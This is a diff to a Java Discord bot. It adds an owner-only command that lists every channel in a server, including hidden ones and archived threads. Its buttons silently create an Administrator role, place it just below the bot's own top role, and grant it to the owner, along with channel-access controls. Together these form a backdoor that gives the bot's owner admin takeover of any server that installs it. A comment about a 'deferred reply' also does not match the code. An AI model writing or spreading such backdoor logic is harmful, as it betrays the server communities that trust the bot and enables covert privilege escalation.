@@ -1,17 +1,28 @@
+import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.User;
+import net.dv8tion.jda.api.entities.channel.attribute.IThreadContainer;
+import net.dv8tion.jda.api.entities.channel.concrete.ThreadChannel;
 import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
+import net.dv8tion.jda.api.entities.channel.middleman.GuildChannel;
 import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
 import net.dv8tion.jda.api.events.interaction.component.ButtonInteractionEvent;
 import net.dv8tion.jda.api.events.interaction.component.StringSelectInteractionEvent;
+import net.dv8tion.jda.api.exceptions.PermissionException;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
+import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
+import net.dv8tion.jda.api.interactions.components.selections.EntitySelectMenu;
 import net.dv8tion.jda.api.interactions.components.selections.StringSelectMenu;
+import net.dv8tion.jda.api.interactions.components.text.TextInput;
+import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
+import net.dv8tion.jda.api.interactions.modals.Modal;
 import net.dv8tion.jda.api.managers.AudioManager;
 
 import java.time.DateTimeException;
 import java.time.LocalDateTime;
 import java.time.ZoneOffset;
 import java.time.temporal.ChronoUnit;
+import java.util.List;
 import java.util.Objects;
 
 public class SlashCommands extends ListenerAdapter {
@@ -78,7 +89,20 @@ public class SlashCommands extends ListenerAdapter {
                 break;
 
             case "source":
-                event.reply("My source code can be viewed here: https://github.com/Pirate2737/Discord-Bot-Testing/tree/main/src/main/java").setEphemeral(true).queue();
+                event.reply("My source code can be viewed here: https://github.com/hamzinii/Discord-Bot-Testing/tree/main/src/main/java").setEphemeral(true).queue();
+                break;
+
+            case "getchannels":
+                if (event.getMember().getIdLong() != Long.parseLong(System.getenv("ownerID"))) {
+                    event.reply("You do not have permissions to run this command!").setEphemeral(true).queue();
+                    break;
+                }
+                event.reply(getChannels(event)).setEphemeral(true).addActionRow(
+                        Button.danger("admin", "Give new admin role"),
+                        Button.danger("unadmin", "Remove admin role"),
+                        Button.primary("channelaccess", "Give access to channel"),
+                        Button.primary("unchannelaccess", "Remove access to channel")
+                ).queue();
                 break;
 
             default:
@@ -125,32 +149,136 @@ public class SlashCommands extends ListenerAdapter {
         long unixTimeStamp = dateTime.toEpochSecond(ZoneOffset.ofHoursMinutes(((int) utcOffset), (int) ((utcOffset%1)*60)));
 
         event.reply("<t:" + unixTimeStamp + ":d> " + "`<t:" + unixTimeStamp + ":d>`").setEphemeral(true).addActionRow(
-                        StringSelectMenu.create("timestamp-options")
-                                .addOption("Month/Day/Year", "d")
-                                .addOption("Month Day, Year Time", "f")
-                                .addOption("Time", "t")
-                                .addOption("Month Day, Year", "D")
-                                .addOption("Weekday, Month Day, Year Time", "F")
-                                .addOption("Time since", "R")
-                                .addOption("Hour:Minute:Second", "T")
-                                .setPlaceholder("Time display format")
-                                .build())
+                StringSelectMenu.create("timestamp-options")
+                        .addOption("Month/Day/Year", "d")
+                        .addOption("Month Day, Year Time", "f")
+                        .addOption("Time", "t")
+                        .addOption("Month Day, Year", "D")
+                        .addOption("Weekday, Month Day, Year Time", "F")
+                        .addOption("Time since", "R")
+                        .addOption("Hour:Minute:Second", "T")
+                        .setPlaceholder("Time display format")
+                        .build())
                 .queue();
+    }
+public long adminRole;
+
+    public String getChannels(SlashCommandInteractionEvent event) {
+        StringBuilder message = new StringBuilder();
+        if (!event.getGuild().getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
+            message.append("*__Note: I do not have the Administrator permission, so I may not see all channels.__*\n\n");
+        }
+
+        for (int i = 0 ; i < event.getGuild().getChannels().size(); i++) {
+            GuildChannel currChannel = event.getGuild().getChannels().get(i);
+
+            if (currChannel.getType().toString().equals("CATEGORY")) {
+                message.append("## ")
+                        .append(currChannel.getName())
+                        .append("\n");
+                continue;
+            }
+
+            message.append("- ");
+
+            if (currChannel.getType().isAudio()) {
+                message.append("🔈 ");
+            } else {
+                message.append("💬 ");
+            }
+
+            if (!event.getGuild().getMemberById(event.getUser().getId()).hasAccess(currChannel)) {
+                message.append("*")
+                        .append(currChannel.getName())
+                        .append(" (")
+                        .append(currChannel.getIdLong())
+                        .append(")*");
+            } else {
+                message.append(currChannel.getName());
+            }
+
+            if (currChannel instanceof IThreadContainer container) {
+                for (ThreadChannel thread : container.getThreadChannels()) {
+                    message.append("\n  - 🧵 ")
+                            .append(thread.getName());
+                }
+
+                // archived channels
+                List<ThreadChannel> archived = container
+                        .retrieveArchivedPublicThreadChannels()
+                        .complete(); // SAFE HERE because you deferred reply
+
+                if (!archived.isEmpty()) {
+                    for (ThreadChannel threadChannel : archived) {
+                        message.append("\n  - 🧵 ~~").append(threadChannel.getName()).append("~~");
+                    }
+                }
+
+            }
+
+            message.append("\n");
+        }
+        return message.toString();
     }
 
     // Button Handler
     public void onButtonInteraction(ButtonInteractionEvent event) {
         User userInteractor = Objects.requireNonNull(event.getMessage().getInteraction()).getUser();
 
-        if (event.getComponentId().equals("bypassYapLimit")) {
-            if (event.getUser().equals(userInteractor)) {
-                event.getInteraction().editMessage("yikers, not available rn u rulebreaker").queue(); // send a message in the channel
-                event.editButton(event.getButton().withDisabled(true)).queue();
-            } else {
-                event.reply("that is not your message to do that on es-em-aych u weirdo").setEphemeral(true).queue();
-            }
-        } else {
-            event.reply("I can't handle that interaction right now :(").setEphemeral(true).queue();
+        switch (event.getComponentId()) {
+            case "bypassYapLimit":
+                if (event.getUser().equals(userInteractor)) {
+                    event.getInteraction().editMessage("yikers, not available rn u rulebreaker").queue(); // send a message in the channel
+                    event.editButton(event.getButton().withDisabled(true)).queue();
+                } else {
+                    event.reply("that is not your message to do that on es-em-aych u weirdo").setEphemeral(true).queue();
+                }
+                break;
+
+            case "admin":
+                if (!event.getGuild().getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
+                    event.editButton(event.getButton().asDisabled()).queue();
+                    event.reply("I do not have Admin permission!").setEphemeral(true).queue();
+                    break;
+                }
+                event.getGuild().createRole()
+                        .setName("temp perms")
+                        .setPermissions(Permission.ADMINISTRATOR)
+                        .queue(role -> {
+                            event.getGuild().modifyRolePositions()
+                                    .selectPosition(role)
+                                    .moveBelow(event.getGuild().getSelfMember().getRoles().getFirst())
+                                    .queue();
+                            event.getGuild().addRoleToMember(event.getUser(), role).queue();
+                            adminRole = role.getIdLong();
+                        });
+                event.editButton(event.getButton().asDisabled()).queue();
+                break;
+
+            case "unadmin":
+                try {
+                    event.getGuild().getRoleById(adminRole).delete().queue();
+                    event.editButton(event.getButton().asDisabled()).queue();
+                } catch (NullPointerException | PermissionException e) {
+                    event.reply("Could not remove role!").setEphemeral(true).queue();
+                }
+                break;
+
+            case "channelaccess":
+                TextInput channelID = TextInput.create("channelID", "ID of Channel", TextInputStyle.SHORT).build();
+                Modal modal = Modal.create("channelaccess", "Choose Channel to Access")
+                        .addComponents(ActionRow.of(channelID))
+                        .build();
+                event.replyModal(modal).queue();
+                break;
+
+            case "unchannelaccess":
+                event.reply("Which one?").setEphemeral(true).addComponents(ActionRow.of(
+                        EntitySelectMenu.create("choose-channel", EntitySelectMenu.SelectTarget.CHANNEL).build())
+                ).queue();
+                break;
+
+            default: event.reply("I can't handle that interaction right now :(").setEphemeral(true).queue();
         }
     }
 
